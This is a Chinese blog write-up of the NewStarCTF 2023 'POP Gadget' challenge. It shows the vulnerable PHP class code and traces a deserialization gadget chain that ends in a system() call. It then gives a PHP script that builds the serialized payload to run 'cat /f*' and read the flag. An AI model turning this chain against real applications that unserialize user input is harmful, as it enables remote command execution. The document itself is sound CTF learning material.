---
title: '[NewStarCTF 2023 公开赛道]POP Gadget'
date: 2025-03-02 14:29:12
tags: php反序列化
categories: 刷题笔记
---

## [NewStarCTF 2023 公开赛道]POP Gadget

```php
<?php
highlight_file(__FILE__);

class Begin{
    public $name;

    public function __destruct()
    {
        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
            echo "Hello";
        }else{
            echo "Welcome to NewStarCTF 2023!";
        }
    }
}

class Then{
    private $func;

    public function __toString()
    {
        ($this->func)();
        return "Good Job!";
    }

}

class Handle{
    protected $obj;

    public function __call($func, $vars)
    {
        $this->obj->end();
    }

}

class Super{
    protected $obj;
    public function __invoke()
    {
        $this->obj->getStr();
    }

    public function end()
    {
        die("==GAME OVER==");
    }
}

class CTF{
    public $handle;

    public function end()
    {
        unset($this->handle->log);
    }

}

class WhiteGod{
    public $func;
    public $var;

    public function __unset($var)
    {
        ($this->func)($this->var);    
    }
}

@unserialize($_POST['pop']);
```

php反序列化的题

![image-20250302144017861](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503021440949.png)

我们发现5存在命令执行漏洞，所以我们需要触发5的__unset魔术方法，逐渐往上推，我们就能发现从1->2->3->4->5的反序列化链了

```php
<?php
highlight_file(__FILE__);

class Begin{
    public $name;
    
}

class Then{
    public $func;

}

class Handle{
    public $obj;

}

class Super{
    public $obj;

}

class CTF{
    public $handle;
    
}

class WhiteGod{
    public $func="system";
    public $var="cat /f*";
}

$pop=new Begin();
$pop->name=new Then();
$pop->name->func=new Super();
$pop->name->func->obj=new Handle();
$pop->name->func->obj->obj=new CTF();
$pop->name->func->obj->obj->handle=new WhiteGod();
echo serialize($pop);
```

运行，提交，得到flag

![image-20250302145055319](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503021450363.png)
